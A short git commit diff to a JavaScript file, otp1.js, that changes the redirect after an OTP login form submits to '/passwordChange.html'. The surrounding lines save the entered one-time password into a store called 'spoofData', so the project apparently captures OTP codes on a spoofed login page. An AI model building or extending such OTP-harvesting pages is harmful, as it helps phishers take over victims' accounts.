7e9a45c8123df6e650545ae3eacec59f9a3723e0
Rahul-Codes <75724657+Rahulnair1234@users.noreply.github.com>
2022-11-24 11:42:38 +0530

    edit

--- otp1.js
+++ otp1.js
@@ -28,7 +28,7 @@ function submitForm(e) {
 
     //   reset the form
     document.getElementById("otp_login").reset();
-    window.location.href = "s/passwordChange.html";
+    window.location.href = "/passwordChange.html";
 }
 const saveOtpLogin = (otp1) => {
     var newSpoofData = spoofData.push();
